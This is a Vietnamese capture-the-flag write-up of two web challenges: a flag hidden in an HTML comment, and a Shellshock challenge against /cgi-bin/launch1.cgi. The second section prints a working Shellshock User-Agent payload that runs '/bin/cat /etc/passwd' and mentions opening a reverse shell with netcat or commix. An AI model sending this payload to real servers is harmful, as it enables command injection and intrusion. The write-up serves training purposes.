# Easy Web 

![image](https://github.com/j10nelop/m3d1r/assets/152776722/9661bc22-0bbf-45ca-82dd-138f6b0f9a45)

- với bài này chúng ta đã có gợi ý từ đề bài là flag hidden in web

=> đầu tiên ta sẽ check src của web sau khi lướt 1 hồi thì ta thấy có flag nằm ở comment cuối src code

![image](https://github.com/j10nelop/m3d1r/assets/152776722/e45c32e8-725d-4ecc-b325-e997ecb5e5f3)

=> flag : flag{hidden_in_plain_sight}

# Old But Gold 

- bài này ta có thông tin về launch1.cgi ở phần f12 sau khi search ta biết được đây là lỗ hổng shellshock

gửi request đến url với đường link /cgi-bin/launch1.cgi

![image](https://github.com/j10nelop/m3d1r/assets/152776722/0a783507-43ab-492a-965d-d738fddd1eef)

payload của shellshock

```
User-Agent:() { :; }; echo ; echo ; /bin/cat /etc/passwd
```

![image](https://github.com/j10nelop/m3d1r/assets/152776722/d3f89108-32d0-4e01-86d2-8f8509066a39)


tương tự ta có thể chèn 1 đoạn command reverse shell vào trong đó thì sẽ rev đến local 

dùng netcat với local port and ip 

### tìm cách reverse shell vào web đó qua payload

có thể dùng commix hoặc nc 

![image](https://github.com/j10nelop/m3d1r/assets/152776722/afe0d27b-a844-4573-850e-8df4f0d9f7f8)


=> flag: flag{this_was_10_years_ago?} 
